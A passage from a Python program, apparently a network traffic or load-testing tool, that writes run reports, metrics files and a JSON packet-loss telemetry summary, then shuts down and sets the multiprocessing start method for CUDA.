            if report_fmt in ("json", "both"):
                out_json = reporting.write_json(rr, base_path + ".json")
                utils.log_info(f"Run raporu (JSON): {out_json}")
            if report_fmt in ("md", "both"):
                out_md = reporting.write_markdown(rr, base_path + ".md")
                utils.log_info(f"Run raporu (MD): {out_md}")
            extra = reporting.write_metrics_files(rr, base_path)
            utils.log_info(f"Run metrikleri: {extra['metrics_json']}")
            utils.log_info(f"Run metrikleri (Prom): {extra['metrics_prom']}")
            if loss_report_out:
                loss_summary = {
                    "schema_version": "1",
                    "generated_at_utc": finished_utc,
                    "wire_loss_est_packets": int(rr.results.get("wire_loss_est_packets", 0) or 0),
                    "wire_loss_est_pct": float(rr.results.get("wire_loss_est_pct", 0.0) or 0.0),
                    "wire_loss_raw_packets": int(rr.results.get("wire_loss_raw_packets", 0) or 0),
                    "wire_loss_raw_pct": float(rr.results.get("wire_loss_raw_pct", 0.0) or 0.0),
                    "wire_loss_estimation_capped": int(rr.results.get("wire_loss_estimation_capped", 0) or 0),
                    "wire_loss_fail_pct": float(rr.results.get("wire_loss_fail_pct", 5.0) or 5.0),
                    "wire_loss_status": str(rr.results.get("wire_loss_status", "ok")),
                    "host_tx_packets_delta": int(rr.results.get("host_tx_packets_delta", 0) or 0),
                    "host_tx_dropped_delta": int(rr.results.get("host_tx_dropped_delta", 0) or 0),
                    "host_tx_errors_delta": int(rr.results.get("host_tx_errors_delta", 0) or 0),
                    "softnet_dropped_delta": int(rr.results.get("softnet_dropped_delta", 0) or 0),
                    "softnet_time_squeeze_delta": int(rr.results.get("softnet_time_squeeze_delta", 0) or 0),
                    "wire_counter_available": int(rr.results.get("wire_counter_available", 0) or 0),
                    "wire_counter_partial": int(rr.results.get("wire_counter_partial", 0) or 0),
                    "wire_counter_available_workers": int(rr.results.get("wire_counter_available_workers", 0) or 0),
                    "wire_counter_missing_workers": int(rr.results.get("wire_counter_missing_workers", 0) or 0),
                    "wire_counter_source": str(rr.results.get("wire_counter_source", "none") or "none"),
                    "wire_counter_confidence": float(rr.results.get("wire_counter_confidence", 0.0) or 0.0),
                    "wire_counter_reason": str(rr.results.get("wire_counter_reason", "") or ""),
                    "wire_tx_packets_delta": int(rr.results.get("wire_tx_packets_delta", 0) or 0),
                    "wire_tx_dropped_delta": int(rr.results.get("wire_tx_dropped_delta", 0) or 0),
                    "wire_tx_errors_delta": int(rr.results.get("wire_tx_errors_delta", 0) or 0),
                    "wire_tx_bytes_delta": int(rr.results.get("wire_tx_bytes_delta", 0) or 0),
                    "wire_tx_accounted_packets": int(rr.results.get("wire_tx_accounted_packets", 0) or 0),
                    "wire_tx_over_attempted_packets": int(rr.results.get("wire_tx_over_attempted_packets", 0) or 0),
                    "wire_loss_measurement_mode": str(
                        rr.results.get("wire_loss_measurement_mode", "unknown") or "unknown"
                    ),
                }
                out_loss = reporting.write_text(
                    json.dumps(loss_summary, indent=2, sort_keys=True),
                    loss_report_out,
                )
                utils.log_info(f"Loss telemetry (JSON): {out_loss}")
        except Exception as e:
            utils.log_warning(f"Run raporu üretilemedi: {e}")

    try:
        manager.shutdown()
    except Exception:
        pass

if __name__ == '__main__':
    try:
        # 'spawn' is required for CUDA to work correctly with multiprocessing.
        # It creates a fresh process instead of forking the parent.
        multiprocessing.set_start_method("spawn")
    except RuntimeError:
        # The start method can only be set once.
        pass
    main()
